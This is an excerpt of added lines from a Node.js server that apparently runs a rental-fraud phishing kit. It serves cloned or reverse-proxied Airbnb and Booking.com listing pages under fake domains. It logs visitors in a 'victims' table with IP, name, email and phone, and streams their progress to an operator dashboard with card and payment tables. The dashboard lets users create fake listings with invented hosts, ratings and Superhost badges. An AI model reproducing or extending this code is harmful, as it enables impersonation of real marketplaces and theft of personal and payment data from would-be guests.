+      3233 function airbnbClonePage(listing, victimId) {                                                               
+      3234   const cloneId = listing.clone_listing_id;                                                                 
+      3235   if (!cloneId) return airbnbPage(listing, victimId);                                                       
+      3236   const title = String(listing.title || 'StayFinder').replace(/[<>&"']/g, '');                              
+      3255 function serveListingPage(req, res, listing) {                                                              
+      3256   if (!listing) return res.status(404).send('<h1 style="text-align:center;margin-top:100px;font-family:sa...
+      3257   listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(listing.id) || listing;                   
+      3266   // Static Airbnb frontend (self-hosted). Set MF_ENABLE_PROXY=1 to re-enable reverse proxy.                
+      3268   const proxyMode = proxyEnabled && Number(listing.proxy_mode) === 1 && (listing.proxy_target_url || list...
+      3270     db.prepare('UPDATE listings SET views = views + 1 WHERE id = ?').run(listing.id);                       
+      3271     markListingOpened(listing);                                                                             
+      3274         "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?,...
+      3276       .run(listing.id, listing.user_id, listing.marketplace, req.ip, req.headers['user-agent'] || '');      
+      3278     res.cookie('mf_px_lid', String(listing.id), { httpOnly: false, sameSite: 'lax', path: '/' });           
+      3279     getProxiedListingHtml(listing, vid, req)                                                                
+      3285         const targetUrl = buildProxyTargetUrl(listing);                                                     
+      3286         res.type('html').send(clientProxyFallback(listing, vid, targetUrl, req));                           
+      3291   db.prepare('UPDATE listings SET views = views + 1 WHERE id = ?').run(listing.id);                         
+      3292   markListingOpened(listing);                                                                               
+      3295       "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?...
+      3297     .run(listing.id, listing.user_id, listing.marketplace, req.ip, req.headers['user-agent'] || '');        
+      3300       listingId: listing.id,                                                                                
+      3301       userId: listing.user_id,                                                                              
+      3308   if (listing.marketplace === 'booking') {                                                                  
+      3309     res.send(bookingPage(listing, victimResult.lastInsertRowid));                                           
+      3312   // Real Airbnb 1:1 offline shell + inject listing (host, photos, price, calendar, map)                    
+      3314   buildOfflineAirbnbListingPage(listing, vid, req)                                                          
+      3319         res.type('html').send(airbnbPage(listing, vid));                                                    
+      3324       res.type('html').send(airbnbPage(listing, vid));                                                      
+      3328 function handleProxySubmit(listingId, body, victimId) {                                                     
+      3340     const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(listingId);                       
+      3341     if (!listing) return { ok: false, error: 'listing not found' };                                         
+      3350             'INSERT INTO victims (listing_id, user_id, marketplace, stage, full_name, email, phone) VALUE...
+      3352           .run(listing.id, listing.user_id, listing.marketplace, 'proxy_form_submit', name, email, phone);  
+      3382           'INSERT INTO victims (listing_id, user_id, marketplace, stage, full_name, email, phone, data_js...
+      3384         .run(listing.id, listing.user_id, listing.marketplace, data.stage || 'details', full_name, email,...
+      3391     try { io.emit('victim_update', { id: victimId, stage: data.stage || 'details', marketplace: listing.m...
+      3395         // dates/guests filled → in review; if already on confirm path, invoice handled by book/stays       
+      3396         advanceListingStatus(listing, 'in_review');                                                         
+      3406 function rewriteProxyText(bodyText, listingId, contentType, req) {                                          
+      3410   return rewriteOriginUrlsInText(bodyText, listingId, req);                                                 
+      3418     const listingId = resolved.listingId;                                                                   
+      3419     const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(listingId);                       
+      3420     if (!listing) return res.status(404).send('not found');                                                 
+      3424       targetUrl = (req.query && req.query.url) || buildProxyTargetUrl(listing);                             
+      3427     let host = '';                                                                                          
+      3431       host = tu.hostname;                                                                                   
+      3436     if (!hostAllowed(host)) return res.status(403).send('host not allowed');                                
+      3438     // Airbnb SPA navigated to /404 — never proxy Oops; send user back to our listing page                  
+      3445       const back = listing.public_path || ('/rooms/' + (listing.listing_code || listing.id));               
+      3454       referer: buildProxyTargetUrl(listing),                                                                
+      3471       // Never serve Airbnb Oops through the asset proxy — bounce to our listing                            
+      3472       if (/html/.test(ct) && (isOriginListingMissing(text, result.status) || result.status === 404 || res...
+      3473         const back = listing.public_path || ('/rooms/' + (listing.listing_code || listing.id));             
+      3477         text = rewriteProxyHtml(text, targetUrl, listingId, reqOrigin(req), null, req);                     
+      3479         text = rewriteProxyText(text, listingId, ct, req);                                                  
+      3508 const BOOKING_CSS = `*{margin:0;padding:0;box-sizing:border-box}body{font-family:'BlinkMacSystemFont',-ap...
+      3621   return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-wi...
+      3638     'row.innerHTML=\'<span class="live-dot"></span> Listing #\'+(d.listingId||"?")+\' · \'+(d.event||"act...
+      3640     'if(t){t.style.display="block";t.textContent="Live: listing #"+(d.listingId||"")+" "+(d.event||"");cl...
+      3641     'document.querySelectorAll("[data-live-listing=\\""+d.listingId+"\\"]").forEach(function(n){n.innerHT...
+      3643     'sock.on("listing_status",function(d){',                                                                
+      3645     'var sel=document.querySelector("select[data-status-listing=\\""+d.id+"\\"]");',                        
+      3646     'if(sel){sel.value=d.booking_status;}',                                                                 
+      3660   return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-wi...
+      3726     totalListings: db.prepare('SELECT COUNT(*) as c FROM listings').get().c,                                
+      3741       <div class="stat-card"><div class="stat-num">${stats.totalListings}</div><div>Listări</div></div>     
+      3820   db.prepare('DELETE FROM listings WHERE user_id = ?').run(uid);                                            
+      3826 app.get('/admin/listings', requireAdmin, (req, res) => {                                                    
+      3827   const listings = db.prepare("SELECT l.*, u.username FROM listings l JOIN users u ON l.user_id = u.id OR...
+      3829     ${listings.map(l => `<tr><td>${l.id}</td><td>${l.username}</td><td>${l.marketplace}</td><td>${l.title...
+      3835   const victims = db.prepare("SELECT v.*, u.username, l.title as listing_title FROM victims v JOIN users ...
+      3897   db.exec('DELETE FROM cards; DELETE FROM victims; DELETE FROM listings; DELETE FROM payments; DELETE FRO...
+      3906     listings: db.prepare('SELECT COUNT(*) as c FROM listings WHERE user_id = ?').get(uid).c,                
+      3909     open: db.prepare("SELECT COUNT(*) as c FROM listings WHERE user_id = ? AND booking_status IN ('open',...
+      3910     paid: db.prepare("SELECT COUNT(*) as c FROM listings WHERE user_id = ? AND booking_status = 'paid'")....
+      3913   const recentListings = db.prepare(`SELECT l.*, a.name as apartment_name FROM listings l                   
+      3914     LEFT JOIN apartments a ON a.id = l.apartment_id                                                         
+      3919   const listingRows = recentListings.map(l => {                                                             
+      3920     const st = bookingStatusMeta(l.booking_status || 'not_opened');                                         
+      3926       <td style="padding:12px;color:#bbb;max-width:180px">${esc(l.apartment_name || l.title || '—')}</td>   
+      3931         <a href="/dashboard/listings/edit/${l.id}" style="color:#4da3ff;font-size:12px;text-decoration:no...
+      3934   }).join('') || `<tr><td colspan="5" style="padding:28px;color:#666;text-align:center">No listings yet. ...
+      3940         <p style="color:#777;margin:8px 0 0;font-size:14px">Manage listings, track booking status, and mo...
+      3944         <a href="/dashboard/create" style="display:inline-block;padding:12px 20px;background:linear-gradi...
+      3948       <div class="stat-card"><div class="stat-num">${stats.listings}</div><div>Listări</div></div>          
+      3957         <h3 style="margin:0">📋 Recent listings</h3>                                                        
+      3962           <th style="padding:8px 12px">Client</th><th style="padding:8px 12px">Apartment</th>               
+      3965         <tbody>${listingRows}</tbody>                                                                       
+      3985   const apartmentsForForm = db.prepare('SELECT id, name, title, location FROM apartments WHERE user_id = ...
+      3986   const hostsForForm = db.prepare('SELECT id, name, photo, is_superhost FROM hosts WHERE user_id = ? ORDE...
+      3989         <div style="color:#888;font-size:12px;letter-spacing:.3px;margin-bottom:4px">NEW LISTING</div>      
+      3991         <p style="color:#777;margin:8px 0 0;font-size:14px;max-width:560px">Pick apartment + host from yo...
+      3994     ${listingCreateFormHtml(null, null, { apartments: apartmentsForForm, hosts: hostsForForm, selectedApa...
+      3998 // Listări — generated listings / reservations table                                                        
+      4000   const listings = db.prepare(`SELECT l.*, a.name as apartment_name FROM listings l                         
+      4001     LEFT JOIN apartments a ON a.id = l.apartment_id                                                         
+      4003   const created = req.query.created ? db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').g...
+      4004   const updated = req.query.updated ? db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').g...
+      4010       <strong style="color:#4CAF50">✓ Listing created (#${created.id})</strong>                             
+      4011       <div style="margin-top:10px;font-size:11px;color:#a5d6a7;letter-spacing:.5px">LISTING URL (OFFICIAL...
+      4019       <strong style="color:#64B5F6">✓ Listing updated (#${updated.id})</strong>                             
+      4020       <div style="margin-top:10px;font-size:11px;color:#90CAF9;letter-spacing:.5px">LISTING URL (OFFICIAL...
+      4023       · <a href="/dashboard/listings/edit/${updated.id}" style="color:#90CAF9">Edit again</a></div>         
+      4028         <div style="color:#888;font-size:12px;letter-spacing:.3px;margin-bottom:4px">RESERVATIONS</div>     
+      4030         <p style="color:#777;margin:8px 0 0;font-size:14px">All generated listings. Track status, bulk de...
+      4032       <a href="/dashboard/create" style="display:inline-block;padding:12px 20px;background:linear-gradien...
+      4035     ${(req.query.deleted ? '<div style="background:#1e3a2f;border:1px solid #2ecc71;color:#9fefc0;padding...
+      4036     ${listingTableHtml(listings, req)}`;                                                                    
+      4041 app.get('/dashboard/listings', requireClient, (req, res) => {                                               
+      4051   if (req.query.host) qs.set('host', req.query.host);                                                       
+      4056 app.get('/dashboard/booking', requireClient, (req, res) => {                                                
+      4059   if (req.query.host) qs.set('host', req.query.host);                                                       
+      4060   qs.set('mp', 'booking');                                                                                  
+      4065 app.post('/dashboard/listings/create', requireClient, (req, res, next) => {                                 
+      4066   listingUpload(req, res, (err) => {                                                                        
+      4076     handleCreateListing(req, res);                                                                          
+      4081 app.get('/dashboard/listings/edit/:id', requireClient, (req, res) => {                                      
+      4083   const listing = db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);   
+      4084   if (!listing) return res.status(404).send('<div style="padding:40px;font-family:sans-serif;background:#...
+      4085   const apartmentsForForm = db.prepare('SELECT id, name, title, location FROM apartments WHERE user_id = ...
+      4086   const hostsForForm = db.prepare('SELECT id, name, photo, is_superhost FROM hosts WHERE user_id = ? ORDE...
+      4088     ${listingCreateFormHtml(listing.marketplace, listing, { apartments: apartmentsForForm, hosts: hostsFo...
+      4089   res.send(clientPage('Editează #' + listing.id, content, req.user));                                       
+      4092 app.post('/dashboard/listings/update/:id', requireClient, (req, res, next) => {                             
+      4093   listingUpload(req, res, (err) => {                                                                        
+      4103     handleUpdateListing(req, res);                                                                          
+      4110 function handleCreateListing(req, res) {                                                                    
+      4114     const apartmentId = parseInt(b.apartment_id, 10) || 0;                                                  
+      4115     if (apartmentId) {                                                                                      
+      4116       apt = db.prepare('SELECT * FROM apartments WHERE id = ? AND user_id = ?').get(apartmentId, req.user...
+      4117       if (!apt) return res.status(400).send('Apartment template not found');                                
+      4119     const marketplace = (b.marketplace || 'airbnb').toLowerCase() === 'booking' ? 'booking' : 'airbnb';     
+      4121     if (!title) return res.status(400).send('Titlu obligatoriu (selectează un apartment sau completează t...
+      4132     const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];                          
+      4155     if (b.amenity) {                                                                                        
+      4156       amenArr = Array.isArray(b.amenity) ? b.amenity : [b.amenity];                                         
+      4158     if (b.amenities_custom) {                                                                               
+      4159       String(b.amenities_custom).split(',').map(s => s.trim()).filter(Boolean).forEach(a => amenArr.push(...
+      4161     if (!amenArr.length && b.amenities) {                                                                   
+      4162       amenArr = String(b.amenities).split(',').map(s => s.trim()).filter(Boolean);                          
+      4164     if (!amenArr.length && apt && apt.amenities) {                                                          
+      4165       amenArr = String(apt.amenities).split(',').map(s => s.trim()).filter(Boolean);                        
+      4168     const amenities = amenArr.join(', ') || 'Wifi, Kitchen, Washer, Free parking';                          
+      4179     const derived = proxyOn ? deriveProxyIdentity(proxyTarget, marketplace) : { code: '', publicPath: '',...
+      4184     let domainHost = autoDisplayDomain(effectiveMp, locale, b.display_domain || (apt && apt.display_domai...
+      4185     if (proxyOn && derived.host) domainHost = derived.host;                                                 
+      4186     const meta = resolveDomainMeta(effectiveMp, domainHost);                                                
+      4188     let code = (b.listing_code || '').trim().replace(/[^a-zA-Z0-9._-]/g, '');                               
+      4190     if (!code) code = randomListingCode(effectiveMp, title, b.location || '');                              
+      4191     if (effectiveMp === 'booking' && !code.endsWith('.html') && !/\.html$/i.test(code)) {                   
+      4192       /* keep hotel slug as-is; booking public_path from derive already has .html when present */           
+      4196       const clash = db.prepare('SELECT id FROM listings WHERE public_path = ? OR listing_code = ?').get(p...
+      4203       code = randomListingCode(effectiveMp, title, b.location || '');                                       
+      4207       proxyTarget = buildProxyTargetUrl({ marketplace: effectiveMp, listing_code: code, display_domain: m...
+      4209     let hostRow = null;                                                                                     
+      4210     const hostId = parseInt(b.host_id, 10) || 0;                                                            
+      4211     if (hostId) {                                                                                           
+      4212       hostRow = db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(hostId, req.user.id);    
+      4213       if (!hostRow) return res.status(400).send('Host not found');                                          
+      4216     let hostPhoto = '';                                                                                     
+      4217     if (hostFiles[0]) hostPhoto = '/uploads/' + hostFiles[0].filename;                                      
+      4219       const hostFile = flatFiles.find(f => f.fieldname === 'host_photo');                                   
+      4220       if (hostFile) hostPhoto = '/uploads/' + hostFile.filename;                                            
+      4222     if (b.host_photo_url && String(b.host_photo_url).trim()) hostPhoto = String(b.host_photo_url).trim();   
+      4223     if (!hostPhoto && hostRow && hostRow.photo) hostPhoto = hostRow.photo;                                  
+      4224     if (!hostPhoto && apt && apt.host_photo) hostPhoto = apt.host_photo;                                    
+      4226     const hostName = (hostRow && hostRow.name)                                                              
+      4227       || (b.host_name || '').trim()                                                                         
+      4228       || (apt && apt.host_name)                                                                             
+      4235     const listingRating = (hostRow && hostRow.rating) || (apt ? (apt.rating || '4.92') : (b.rating || '4....
+      4236     const listingReviews = hostRow                                                                          
+      4237       ? (hostRow.reviews_count || 48)                                                                       
+      4240     const result = db.prepare(`INSERT INTO listings                                                         
+      4241       (user_id, marketplace, title, description, price, price_month, image_url, images, location, guests,...
+      4256       amenities,                                                                                            
+      4257       hostName,                                                                                             
+      4258       hostPhoto || '',                                                                                      
+      4259       listingRating,                                                                                        
+      4260       listingReviews,                                                                                       
+      4261       (apt ? (apt.property_type || 'Entire apartment') : (b.property_type || 'Entire apartment')),          
+      4262       meta.host,                                                                                            
+      4271       apartmentId || null,                                                                                  
+      4272       hostId || null,                                                                                       
+      4281       db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'create_listing', ?,...
+      4282         req.user.id, `listing #${result.lastInsertRowid} ${marketplace} ${publicPath}`, req.ip              
+      4285     const created = db.prepare('SELECT * FROM listings WHERE id = ?').get(result.lastInsertRowid);          
+      4286     syncListingToClone(created).catch(e => console.error('[clone] create sync:', e.message));               
+      4289     console.error('create listing error', err);                                                             
+      4295 function handleUpdateListing(req, res) {                                                                    
+      4298     const existing = db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);
+      4309     const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];                          
+      4332     if (b.amenity) amenArr = Array.isArray(b.amenity) ? b.amenity : [b.amenity];                            
+      4333     if (b.amenities_custom) {                                                                               
+      4334       String(b.amenities_custom).split(',').map(s => s.trim()).filter(Boolean).forEach(a => amenArr.push(...
+      4337     const amenities = amenArr.join(', ') || existing.amenities || 'Wifi, Kitchen';                          
+      4346     const derived = proxyOn ? deriveProxyIdentity(proxyTarget, marketplace) : { code: '', publicPath: '',...
+      4348     let domainHost = autoDisplayDomain(marketplace, locale, b.display_domain || existing.display_domain);   
+      4349     if (proxyOn && derived.host) domainHost = derived.host;                                                 
+      4350     const meta = resolveDomainMeta(marketplace, domainHost);                                                
+      4352     // When proxy mode + real target URL: refresh public_path / listing_code from room id                   
+      4353     let nextCode = existing.listing_code;                                                                   
+      4356       const clash = db.prepare('SELECT id FROM listings WHERE id != ? AND (public_path = ? OR listing_cod...
+      4366     let hostPhoto = existing.host_photo || '';                                                              
+      4367     if (b.remove_host_photo === '1' || b.remove_host_photo === 'on') hostPhoto = '';                        
+      4368     if (hostFiles[0]) hostPhoto = '/uploads/' + hostFiles[0].filename;                                      
+      4369     if (b.host_photo_url && String(b.host_photo_url).trim()) hostPhoto = String(b.host_photo_url).trim();   
+      4371     let nextHostId = existing.host_id || null;                                                              
+      4372     let hostName = b.host_name || existing.host_name || req.user.username;                                  
+      4373     const updHostId = parseInt(b.host_id, 10) || 0;                                                         
+      4374     if (updHostId) {                                                                                        
+      4375       const hr = db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(updHostId, req.user.id);
+      4377         nextHostId = hr.id;                                                                                 
+      4378         hostName = hr.name || hostName;                                                                     
+      4379         if (hr.photo) hostPhoto = hr.photo;                                                                 
+      4388     db.prepare(`UPDATE listings SET                                                                         
+      4390       location = ?, guests = ?, bedrooms = ?, beds = ?, baths = ?, amenities = ?,                           
+      4391       host_name = ?, host_photo = ?, rating = ?, reviews = ?, property_type = ?,                            
+      4392       display_domain = ?, public_path = ?, listing_code = ?, locale = ?, currency = ?, video_url = ?, hid...
+      4395       apartment_id = COALESCE(?, apartment_id),                                                             
+      4396       host_id = ?                                                                                           
+      4409       amenities,                                                                                            
+      4410       hostName,                                                                                             
+      4411       hostPhoto,                                                                                            
+      4414       b.property_type || existing.property_type || 'Entire apartment',                                      
+      4415       meta.host,                                                                                            
+      4430       (parseInt(b.apartment_id, 10) || null),                                                               
+      4431       nextHostId,                                                                                           
+      4437       db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'update_listing', ?,...
+      4438         req.user.id, `listing #${id} updated`, req.ip                                                       
+      4442     const updatedRow = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);                           
+      4443     syncListingToClone(updatedRow).catch(e => console.error('[clone] update sync:', e.message));            
+      4446     console.error('update listing error', err);                                                             
+      4454 function deleteListingCascade(id, userId) {                                                                 
+      4455   const listing = db.prepare('SELECT id FROM listings WHERE id = ? AND user_id = ?').get(id, userId);       
+      4456   if (!listing) return false;                                                                               
+      4457   const victims = db.prepare('SELECT id FROM victims WHERE listing_id = ?').all(id);                        
+      4462   try { db.prepare('DELETE FROM victims WHERE listing_id = ?').run(id); } catch (e) {}                      
+      4463   try { db.prepare('DELETE FROM payments WHERE listing_id = ?').run(id); } catch (e) {}                     
+      4464   db.prepare('DELETE FROM listings WHERE id = ? AND user_id = ?').run(id, userId);                          
+      4470 // Hierarchical join-safe: /_mfpx/:id/u/{s|p}/{host}{path...}                                               
+      4482     const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);                              
+      4483     if (!listing) return res.json({ ok: false, error: 'not found' });                                       
+      4505   const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(id);                                
+      4506   if (!listing) return res.status(404).send('not found');                                                   
+      4507   const url = req.query.url || buildProxyTargetUrl(listing);                                                
+      4524     const listing = db.prepare('SELECT * FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id); 
+      4525     if (!listing) return res.status(404).json({ ok: false });                                               
+      4536 app.get('/dashboard/listings/delete/:id', requireClient, (req, res) => {                                    
+      4540     deleteListingCascade(id, req.user.id);                                                                  
+      4542     console.error('delete listing error', err);                                                             
+      4548 app.post('/dashboard/listings/delete-bulk', requireClient, (req, res) => {                                  
+      4557         if (deleteListingCascade(id, req.user.id)) deleted++;                                               
+      4569 // === LISTING STATUS ===                                                                                   
+      4570 app.post('/dashboard/listings/status/:id', requireClient, (req, res) => {                                   
+      4574     const allowed = BOOKING_STATUSES.map(s => s.id);                                                        
+      4576     const row = db.prepare('SELECT id FROM listings WHERE id = ? AND user_id = ?').get(id, req.user.id);    
+      4578     db.prepare("UPDATE listings SET booking_status = ?, status_updated_at = datetime('now'), opened_at = ...
+      4580     try { io.emit('listing_status', { id, booking_status: status, userId: req.user.id }); } catch (e) {}    
+      4587 // === APARTMENTS LIBRARY ===                                                                               
+      4588 app.get('/dashboard/apartments', requireClient, (req, res) => {                                             
+      4589   const apts = db.prepare('SELECT * FROM apartments WHERE user_id = ? ORDER BY updated_at DESC, id DESC')...
+      4602         <a href="/dashboard/apartments/edit/${a.id}" style="color:#4da3ff;margin-right:12px;text-decorati...
+      4604         <a href="/dashboard/apartments/delete/${a.id}" onclick="return confirm('Delete apartment?')" styl...
+      4607   }).join('') || `<tr><td colspan="7" style="padding:32px;color:#666;text-align:center">No apartments yet...
+      4610         <h1 style="margin:0 0 6px">Apartment library</h1>                                                   
+      4611         <p style="color:#777;margin:0;font-size:14px">Shared templates for Airbnb & Booking. Save once, p...
+      4613       <a href="#aptForm" style="padding:12px 20px;background:linear-gradient(90deg,#FF385C,#E61E4D);color...
+      4621     <div style="margin-top:28px">${apartmentFormHtml(null)}</div>`;                                         
+      4622   res.send(clientPage('Apartments', content, req.user));                                                    
+      4625 app.get('/dashboard/apartments/edit/:id', requireClient, (req, res) => {                                    
+      4627   const apt = db.prepare('SELECT * FROM apartments WHERE id = ? AND user_id = ?').get(id, req.user.id);     
+      4628   if (!apt) return res.redirect('/dashboard/apartments');                                                   
+      4629   const content = `<div style="margin-bottom:8px"><a href="/dashboard/apartments" style="color:#8899ff">←...
+      4630   res.send(clientPage('Apartments', content, req.user));                                                    
+      4633 app.get('/dashboard/apartments/delete/:id', requireClient, (req, res) => {                                  
+      4635   db.prepare('DELETE FROM apartments WHERE id = ? AND user_id = ?').run(id, req.user.id);                   
+      4636   res.redirect('/dashboard/apartments');                                                                    
+      4639 app.post('/dashboard/apartments/save', requireClient, (req, res, next) => {                                 
+      4640   listingUpload(req, res, (err) => {                                                                        
+      4651       const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];                        
+      4654       let existing = id ? db.prepare('SELECT * FROM apartments WHERE id = ? AND user_id = ?').get(id, req...
+      4670       if (b.amenity) amenArr = Array.isArray(b.amenity) ? b.amenity : [b.amenity];                          
+      4671       if (b.amenities_custom) String(b.amenities_custom).split(',').map(s => s.trim()).filter(Boolean).fo...
+      4672       const amenities = [...new Set(amenArr.map(s => String(s).trim()).filter(Boolean))].join(', ') || (e...
+      4676       let hostPhoto = (existing && existing.host_photo) || '';                                              
+      4677       if (hostFiles[0]) hostPhoto = '/uploads/' + hostFiles[0].filename;                                    
+      4678       if (b.host_photo_url && String(b.host_photo_url).trim()) hostPhoto = String(b.host_photo_url).trim(); 
+      4682       const domainHost = autoDisplayDomain(marketplace, locale, b.display_domain || '');                    
+      4687         amenities, b.host_name || req.user.username, hostPhoto, b.rating || '4.92', parseInt(b.reviews, 1...
+      4688         b.property_type || 'Entire apartment', domainHost, locale, currency, videoUrl, hideNightly,         
+      4692         db.prepare(`UPDATE apartments SET name=?, marketplace=?, title=?, description=?, price=?, price_m...
+      4693           location=?, guests=?, bedrooms=?, beds=?, baths=?, amenities=?, host_name=?, host_photo=?, rati...
+      4694           property_type=?, display_domain=?, locale=?, currency=?, video_url=?, hide_nightly=?, proxy_tar...
+      4697         db.prepare(`INSERT INTO apartments (user_id, name, marketplace, title, description, price, price_...
+      4698           location, guests, bedrooms, beds, baths, amenities, host_name, host_photo, rating, reviews, pro...
+      4702       res.redirect('/dashboard/apartments');                                                                
+      4704       console.error('apartment save', e);                                                                   
+      4710 function amenityChipsHtml(selected) {                                                                       
+      4713   return AMENITY_LIST.map((a) => {                                                                          
+      4717     return `<label class="amen-item"><input type="checkbox" name="amenity" value="${esc(a)}"${on ? ' chec...
+      4721 function apartmentFormHtml(apt) {                                                                           
+      4725   if (isEdit && A.amenities) existingAmens = String(A.amenities).split(',').map(s => s.trim()).filter(Boo...
+      4726   const amenChecks = amenityChipsHtml(existingAmens);                                                       
+      4771 <form method="POST" action="/dashboard/apartments/save" enctype="multipart/form-data" class="mf-card" id=...
+      4773   <h2>${isEdit ? 'Edit apartment' : 'New apartment'}</h2>                                                   
+      4774   <p class="mf-sub">Reusable property template — available on both Airbnb and Booking when you create a l...
+      4780     <div class="mf-field"><label>Property type</label>                                                      
+      4781       <select name="property_type">${['Entire apartment','Entire home','Private room','Hotel room','Share...
+      4803   <div class="mf-sec"><span>4</span> Amenities</div>                                                        
+      4806     <div class="mf-field full"><label>Extra amenities (comma-separated)</label><input type="text" name="a...
+      4819     <button class="mf-btn" type="submit">${isEdit ? 'Save changes' : 'Save apartment'}</button>             
+      4820     ${isEdit ? '<a href="/dashboard/apartments" style="color:#8899ff;font-size:13px;text-decoration:none"...
+      4828   const victims = db.prepare("SELECT v.*, l.title as listing_title, l.client_first_name, l.client_last_na...
+      4832       <p style="color:#777;margin:6px 0 0;font-size:14px">Visitors & booking funnel contacts. Bulk select...
+      4837       <div id="liveFeed" style="max-height:180px;overflow:auto;color:#888;font-size:13px">Waiting for cli...
+      4847       <th></th><th>ID</th><th>Client listing</th><th>Email</th><th>Phone</th><th>Name</th><th>Market</th>...
+      4854         <td>${esc(cl || v.listing_title || '-')}</td>                                                       
+      5169 // === HOSTS LIBRARY ===                                                                                    
+      5170 app.get('/dashboard/hosts', requireClient, (req, res) => {                                                  
+      5171   const hosts = db.prepare('SELECT * FROM hosts WHERE user_id = ? ORDER BY updated_at DESC, id DESC').all...
+      5173   const rows = hosts.map(h => {                                                                             
+      5181       <td style="padding:12px;color:#aaa">${Number(h.is_superhost)===1?'Superhost':'Host'}</td>             
+      5186         <a href="/dashboard/hosts/edit/${h.id}" style="color:#4da3ff;margin-right:12px;text-decoration:no...
+      5187         <a href="/dashboard/hosts/delete/${h.id}" onclick="return confirm('Delete host?')" style="color:#...
+      5190   }).join('') || `<tr><td colspan="8" style="padding:32px;color:#666;text-align:center">No hosts yet. Add...
+      5193         <h1 style="margin:0 0 6px">Hosts</h1>                                                               
+      5194         <p style="color:#777;margin:0;font-size:14px">Save host profiles once, then pick them when creati...
+      5196       <a href="#hostForm" style="padding:12px 20px;background:linear-gradient(90deg,#FF385C,#E61E4D);colo...
+      5198     <form method="POST" action="/dashboard/hosts/delete-bulk" id="hsBulkForm" onsubmit="return confirm('D...
+      5206           <th style="padding:12px"></th><th style="padding:12px">ID</th><th style="padding:12px">Host</th...
+      5211     <div style="margin-top:28px">${hostFormHtml(null)}</div>                                                
+      5219   res.send(clientPage('Hosts', content, req.user));                                                         
+      5222 app.get('/dashboard/hosts/edit/:id', requireClient, (req, res) => {                                         
+      5224   const host = db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(id, req.user.id);         
+      5225   if (!host) return res.redirect('/dashboard/hosts');                                                       
+      5226   const content = `<div style="margin-bottom:8px"><a href="/dashboard/hosts" style="color:#8899ff;text-de...
+      5227   res.send(clientPage('Hosts', content, req.user));                                                         
+      5230 app.get('/dashboard/hosts/delete/:id', requireClient, (req, res) => {                                       
+      5232   db.prepare('DELETE FROM hosts WHERE id = ? AND user_id = ?').run(id, req.user.id);                        
+      5233   res.redirect('/dashboard/hosts?msg=Host+deleted');                                                        
+      5236 app.post('/dashboard/hosts/delete-bulk', requireClient, (req, res) => {                                     
+      5242     const r = db.prepare('DELETE FROM hosts WHERE id = ? AND user_id = ?').run(id, req.user.id);            
+      5245   res.redirect('/dashboard/hosts?msg=Deleted+' + n + '+hosts');                                             
+      5248 app.post('/dashboard/hosts/save', requireClient, (req, res, next) => {                                      
+      5249   listingUpload(req, res, (err) => {                                                                        
+      5255       if (!name) return res.status(400).send('Host name required');                                         
+      5256       let existing = id ? db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(id, req.user...
+      5259       const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];                        
+      5260       if (hostFiles[0]) photo = '/uploads/' + hostFiles[0].filename;                                        
+      5266         (b.is_superhost === '1' || b.is_superhost === 'on') ? 1 : 0,                                        
+      5278         db.prepare(`UPDATE hosts SET name=?, photo=?, is_superhost=?, joined_year=?, response_rate=?, res...
+      5282         db.prepare(`INSERT INTO hosts (user_id, name, photo, is_superhost, joined_year, response_rate, re...
+      5286       res.redirect('/dashboard/hosts?msg=Host+saved');                                                      
+      5288       console.error('host save', e);                                                                        
+      5294 function hostFormHtml(host) {                                                                               
+      5295   const H = host || {};                                                                                     
+      5322 <form method="POST" action="/dashboard/hosts/save" enctype="multipart/form-data" class="mf-card" id="host...
+      5324   <h2>${isEdit ? 'Edit host' : 'New host'}</h2>                                                             
+      5325   <p class="mf-sub">Profile shown on the public listing (name, photo, Superhost badge, response stats).</p> 
+      5329     <div class="mf-field"><label>Host name *</label><input name="name" required value="${esc(H.name||'')}...
+      5331     <div class="mf-field"><label>Photo upload</label><input type="file" name="host_photo" accept="image/*...
+      5332     <div class="mf-field"><label>Or photo URL</label><input name="photo_url" value="${esc((H.photo && !St...
+      5333     <div class="full mf-check"><input type="checkbox" name="is_superhost" value="1" id="hsSuper"${(H.is_s...
+      5347     <div class="mf-field full"><label>About the host</label><textarea name="about" rows="4" placeholder="...
+      5350     <button class="mf-btn" type="submit">${isEdit ? 'Save changes' : 'Save host'}</button>                  
+      5351     ${isEdit ? '<a href="/dashboard/hosts" style="color:#8899ff;font-size:13px;text-decoration:none">Canc...
+      5357 // Airbnb/Booking menu pages removed — redirect handlers registered near Create/Listări                     
+      5361 function parseListingImages(listing) {                                                                      
+      5363   try { if (listing.images) imgs = JSON.parse(listing.images); } catch (e) {}                               
+      5364   if ((!imgs || !imgs.length) && listing.image_url) imgs = [listing.image_url];                             
+      5386 function listingCreateFormHtml(fixedMarketplace, listing, opts) {                                           
+      5388   const L = listing || null;                                                                                
+      5392   const apartments = Array.isArray(opts.apartments) ? opts.apartments : [];                                 
+      5393   const hosts = Array.isArray(opts.hosts) ? opts.hosts : [];                                                
+      5394   const selApt = isEdit ? L.apartment_id : opts.selectedApartmentId;                                        
